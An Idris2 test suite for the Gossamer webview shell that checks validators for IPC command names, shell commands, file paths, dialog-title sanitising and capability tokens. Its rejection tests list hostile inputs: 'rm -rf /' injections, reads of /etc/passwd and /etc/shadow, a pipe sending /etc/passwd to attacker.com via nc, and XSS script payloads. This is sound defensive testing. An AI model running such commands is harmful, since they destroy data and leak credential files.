-- SPDX-License-Identifier: MPL-2.0
-- Copyright (c) Jonathan D.A. Jewell <j.d.a.jewell@open.ac.uk>
--
||| Security aspect tests for the Gossamer webview shell.
|||
||| Ported 1:1 from tests/aspect/security_test.ts. The TS suite uses regex;
||| Idris2 has no built-in regex, so the IPC command name validator and the
||| dialog title sanitiser are reimplemented as straight character / substring
||| predicates with the same observable behaviour.
|||
||| Covers:
|||   - IPC injection: malicious command names + oversized payloads rejected
|||   - Shell command injection: ; & | ` $ \0 blocked
|||   - Filesystem capability bypass: traversal + null-byte + null-grant denied
|||   - Webview escaping: script tags and HTML stripped from dialog titles
|||   - Capability forging: distinct tokens, independent revocation

module SecurityTest

import Data.IORef
import Data.List
import Data.SortedSet
import Data.String
import Test.Spec

%default covering

--------------------------------------------------------------------------------
-- IPC validators (no regex — manual character predicates)
--------------------------------------------------------------------------------

||| Allowed in IPC command names: ASCII letters, digits, underscore, hyphen.
isIPCNameChar : Char -> Bool
isIPCNameChar c = isAlphaNum c || c == '_' || c == '-'

||| IPC command name validation: 1–255 chars, alphanumeric + _ + -
isValidIPCCommand : String -> Bool
isValidIPCCommand name =
  let len = length name
  in if len == 0 || len > 255
       then False
       else all isIPCNameChar (unpack name)

||| Payload-size limit (matches MAX_PAYLOAD_BYTES in the TS port).
MAX_PAYLOAD_BYTES : Nat
MAX_PAYLOAD_BYTES = 1024 * 1024

||| Categorical payload validation. In TS the validator catches both
||| circular references (non-serialisable) and oversized payloads. In
||| Idris2 we model these as explicit constructors — `PValidSmall` /
||| `PValidLarge` / `PNonSerialisable` — and treat circular / oversized
||| as rejected.
data Payload
  = PValidSmall      -- normal payload, well under the limit
  | PValidLarge      -- payload that exceeds MAX_PAYLOAD_BYTES
  | PNonSerialisable -- e.g. circular reference (cannot JSON.stringify)

isValidIPCPayload : Payload -> Bool
isValidIPCPayload PValidSmall      = True
isValidIPCPayload PValidLarge      = False
isValidIPCPayload PNonSerialisable = False

--------------------------------------------------------------------------------
-- Shell command validator
--------------------------------------------------------------------------------

||| Characters that allow shell injection (must be absent for AllowCommands).
isInjectionChar : Char -> Bool
isInjectionChar c = c == ';' || c == '&' || c == '|' || c == '`' || c == '$'

||| Shell command validation: no null bytes, no unquoted injection metas.
isValidShellCommand : String -> Bool
isValidShellCommand cmd =
  not (isInfixOf "\0" cmd) && not (any isInjectionChar (unpack cmd))

--------------------------------------------------------------------------------
-- Filesystem path validator
--------------------------------------------------------------------------------

||| Filesystem path validation: non-empty, no null bytes, no traversal.
isValidFSPath : String -> Bool
isValidFSPath path =
  length path > Z
    && not (isInfixOf "\0" path)
    && not (isInfixOf ".." path)

--------------------------------------------------------------------------------
-- Dialog title sanitiser — strips <script>...</script> blocks and ALL HTML tags
--------------------------------------------------------------------------------

||| Strip a single matching <script>...</script> block (case-insensitive).
||| Marked `partial` because the recursion jumps arbitrary-sized chunks ahead
||| (past </script>), so Idris2's structural-decrease checker can't prove
||| termination — though every step strictly reduces the list length.
partial
stripScriptBlocks : String -> String
stripScriptBlocks input = pack (go (unpack input))
  where
    -- Detect `<script` opening (case-insensitive) at this position.
    isScriptOpen : List Char -> Bool
    isScriptOpen ('<' :: cs) = case map toLower (take 6 cs) of
                                 ['s','c','r','i','p','t'] => True
                                 _                          => False
    isScriptOpen _           = False

    -- Detect `</script>` closing (case-insensitive).
    isScriptClose : List Char -> Bool
    isScriptClose ('<' :: '/' :: cs) = case map toLower (take 6 cs) of
                                         ['s','c','r','i','p','t'] => True
                                         _                          => False
    isScriptClose _                  = False

    partial
    dropUntilClose : List Char -> List Char
    dropUntilClose []        = []
    dropUntilClose cs@(_::r) =
      if isScriptClose cs
        then drop 9 cs  -- length "</script>" = 9
        else dropUntilClose r

    partial
    go : List Char -> List Char
    go []        = []
    go cs@(c::r) =
      if isScriptOpen cs
        then go (dropUntilClose (drop 7 cs))  -- skip "<script"
        else c :: go r

||| Strip every <...> tag from a string. `partial` for the same reason as
||| stripScriptBlocks — manifestly terminates but jumps past '>' arbitrarily.
partial
stripHTMLTags : String -> String
stripHTMLTags input = pack (go (unpack input))
  where
    partial
    dropToGT : List Char -> List Char
    dropToGT []         = []
    dropToGT ('>' :: r) = r
    dropToGT (_   :: r) = dropToGT r

    partial
    go : List Char -> List Char
    go []         = []
    go ('<' :: r) = go (dropToGT r)
    go (c   :: r) = c :: go r

||| Sanitise a dialog title: remove script blocks first, then strip remaining HTML.
||| Inherits `partial` from its components — both stripping helpers are partial.
partial
sanitiseDialogTitle : String -> String
sanitiseDialogTitle = stripHTMLTags . stripScriptBlocks

--------------------------------------------------------------------------------
-- Capability store — set-based, distinct from CapRegistry in other tests
--------------------------------------------------------------------------------

record CapabilityStore where
  constructor MkCapStore
  grantedRef   : IORef (SortedSet Bits64)
  revokedRef   : IORef (SortedSet Bits64)
  nextTokenRef : IORef Bits64

newCapStore : IO CapabilityStore
newCapStore = do
  g <- newIORef empty
  r <- newIORef empty
  n <- newIORef 1
  pure (MkCapStore g r n)

capStoreGrant : CapabilityStore -> Bits32 -> IO Bits64
capStoreGrant store _ = do
  tok <- readIORef store.nextTokenRef
  writeIORef store.nextTokenRef (tok + 1)
  modifyIORef store.grantedRef (insert tok)
  pure tok

capStoreIsValid : CapabilityStore -> Bits64 -> IO Bool
capStoreIsValid store tok = do
  if tok == 0
    then pure False
    else do
      granted <- readIORef store.grantedRef
      revoked <- readIORef store.revokedRef
      pure (contains tok granted && not (contains tok revoked))

capStoreRevoke : CapabilityStore -> Bits64 -> IO ()
capStoreRevoke store tok = modifyIORef store.revokedRef (insert tok)

--------------------------------------------------------------------------------
-- Helper for the "a".repeat(n) idiom
--------------------------------------------------------------------------------

strRepeat : Nat -> String -> String
strRepeat Z     _ = ""
strRepeat (S k) s = s ++ strRepeat k s

--------------------------------------------------------------------------------
-- Tests
--------------------------------------------------------------------------------

public export
suiteName : String
suiteName = "Gossamer ABI · SecurityTest"

||| Marked `partial` because the dialog-title sanitiser helpers are partial
||| (manifestly terminating but not structurally recursive). The runtime
||| behaviour is fully exercised by the test cases below.
public export
partial
tests : List TestCase
tests =
  -- ---------- IPC injection ----------
  [ test "security/ipc: valid command names are accepted" $
      let valid : List String
          valid = [ "open-file", "save", "ping", "list-dir", "close-window"
                  , "a", "cmd123", strRepeat 255 "a"
                  ]
      in assertTrue "every valid command must be accepted"
                    (all isValidIPCCommand valid)

  , test "security/ipc: malicious command names are rejected" $
      let malicious : List String
          malicious = [ ""
                      , "../etc/passwd"
                      , "cmd;rm -rf /"
                      , "cmd\0evil"
                      , "cmd && evil"
                      , "cmd | pipe"
                      , "<script>alert(1)</script>"
                      , strRepeat 256 "a"
                      , "cmd\nnewline"
                      , "cmd\ttab"
                      ]
      in assertTrue "every malicious command must be rejected"
                    (all (not . isValidIPCCommand) malicious)

  , test "security/ipc: oversized payload is rejected" $
      assertEq (isValidIPCPayload PValidLarge) False

  , test "security/ipc: non-serialisable payload is rejected" $
      assertEq (isValidIPCPayload PNonSerialisable) False

  , test "security/ipc: normal payloads are accepted" $
      assertEq (isValidIPCPayload PValidSmall) True

  -- ---------- shell command injection ----------
  , test "security/shell: safe commands are accepted" $
      let safe : List String
          safe = [ "ls", "echo hello", "cat /tmp/file.txt"
                 , "/usr/bin/python3 script.py arg", "git status"
                 , "deno run main.ts"
                 ]
      in assertTrue "every safe command must be accepted"
                    (all isValidShellCommand safe)

  , test "security/shell: semicolon injection is blocked" $
      let attacks : List String
          attacks = [ "ls; rm -rf /"
                    , "echo hello; cat /etc/passwd"
                    , "cmd; cmd2; cmd3"
                    ]
      in assertTrue "every semicolon injection must be blocked"
                    (all (not . isValidShellCommand) attacks)

  , test "security/shell: backtick injection is blocked" $
      let attacks : List String
          attacks = ["echo `id`", "ls `whoami`", "`rm -rf /`"]
      in assertTrue "every backtick injection must be blocked"
                    (all (not . isValidShellCommand) attacks)

  , test "security/shell: null byte injection is blocked" $
      let attacks : List String
          attacks = ["ls\0-la", "cat /etc/passwd\0", "\0evil"]
      in assertTrue "every null-byte injection must be blocked"
                    (all (not . isValidShellCommand) attacks)

  , test "security/shell: pipe injection is blocked" $
      let attacks : List String
          attacks = [ "ls | grep secret"
                    , "cat /etc/passwd | nc attacker.com 4444"
                    , "cmd | base64"
                    ]
      in assertTrue "every pipe injection must be blocked"
                    (all (not . isValidShellCommand) attacks)

  , test "security/shell: dollar expansion is blocked" $
      let attacks : List String
          attacks = [ "echo $PATH"
                    , "ls $HOME"
                    , "cmd $( evil )"
                    , "${IFS}rm${IFS}-rf${IFS}/"
                    ]
      in assertTrue "every dollar expansion must be blocked"
                    (all (not . isValidShellCommand) attacks)

  -- ---------- filesystem capability bypass ----------
  , test "security/filesystem: access without grant is denied" $ do
      store <- newCapStore
      valid <- capStoreIsValid store 9999  -- forged
      assertEq valid False

  , test "security/filesystem: access with valid grant is permitted" $ do
      store <- newCapStore
      tok <- capStoreGrant store 0
      valid <- capStoreIsValid store tok
      assertEq valid True

  , test "security/filesystem: revoked grant is denied" $ do
      store <- newCapStore
      tok <- capStoreGrant store 0
      capStoreRevoke store tok
      valid <- capStoreIsValid store tok
      assertEq valid False

  , test "security/filesystem: null token (0) is always denied" $ do
      store <- newCapStore
      valid <- capStoreIsValid store 0
      assertEq valid False

  , test "security/filesystem: traversal paths are rejected" $
      let paths : List String
          paths = [ "../etc/passwd"
                  , "/home/user/../../../etc/shadow"
                  , "foo/../bar/../../../secret"
                  , ".."
                  , "../../"
                  ]
      in assertTrue "every traversal path must be rejected"
                    (all (not . isValidFSPath) paths)

  , test "security/filesystem: valid paths are accepted" $
      let paths : List String
          paths = [ "/home/user/file.txt", "/tmp/gossamer.log"
                  , "relative/path/file.md", "/var/lib/gossamer/data"
                  ]
      in assertTrue "every valid path must be accepted"
                    (all isValidFSPath paths)

  , test "security/filesystem: null-byte path is rejected" $
      assertEq (isValidFSPath "/tmp/file\0evil") False

  -- ---------- webview escaping (dialog titles) ----------
  , test "security/webview: script tags in dialog title are sanitised" $
      let attacks : List String
          attacks = [ "<script>alert(\"xss\")</script>"
                    , "<script src=\"evil.js\"></script>"
                    , "<SCRIPT>evil()</SCRIPT>"
                    ]
          containsScript : String -> Bool
          containsScript s =
            let lower = toLower s
            in isInfixOf "<script" lower || isInfixOf "</script" lower
      in assertTrue "every script tag must be removed by sanitisation"
                    (all (\t => not (containsScript (sanitiseDialogTitle t)))
                         attacks)

  , test "security/webview: HTML tags in dialog title are stripped" $
      assertEq (sanitiseDialogTitle "<b>Open</b> <em>File</em>") "Open File"

  , test "security/webview: plain titles are unchanged by sanitisation" $
      assertEq (sanitiseDialogTitle "Open File") "Open File"

  , test "security/webview: event handler attributes stripped" $
      let sanitised = sanitiseDialogTitle "<img onerror=\"evil()\" src=\"x\">"
      in assertEq (isInfixOf "onerror" sanitised) False

  -- ---------- capability forging ----------
  , test "security/capability: tokens from different grants are distinct" $ do
      store <- newCapStore
      t1 <- capStoreGrant store 0
      t2 <- capStoreGrant store 0
      assertNotEq t1 t2

  , test "security/capability: revoke does not affect other tokens" $ do
      store <- newCapStore
      t1 <- capStoreGrant store 0
      t2 <- capStoreGrant store 1
      t3 <- capStoreGrant store 2
      capStoreRevoke store t2
      v1 <- capStoreIsValid store t1
      v2 <- capStoreIsValid store t2
      v3 <- capStoreIsValid store t3
      allPass [assertEq v1 True, assertEq v2 False, assertEq v3 True]

  , test "security/capability: sequentially exhausted tokens are all denied" $ do
      store <- newCapStore
      tokens <- traverse (\i => capStoreGrant store (cast (i `mod` 7)))
                         [0 .. 19]
      traverse_ (capStoreRevoke store) tokens
      validities <- traverse (capStoreIsValid store) tokens
      assertTrue "every revoked token must be denied"
                 (all not validities)
  ]

main : IO ()
main = do
  putStrLn $ "=== " ++ suiteName ++ " ==="
  runTests tests
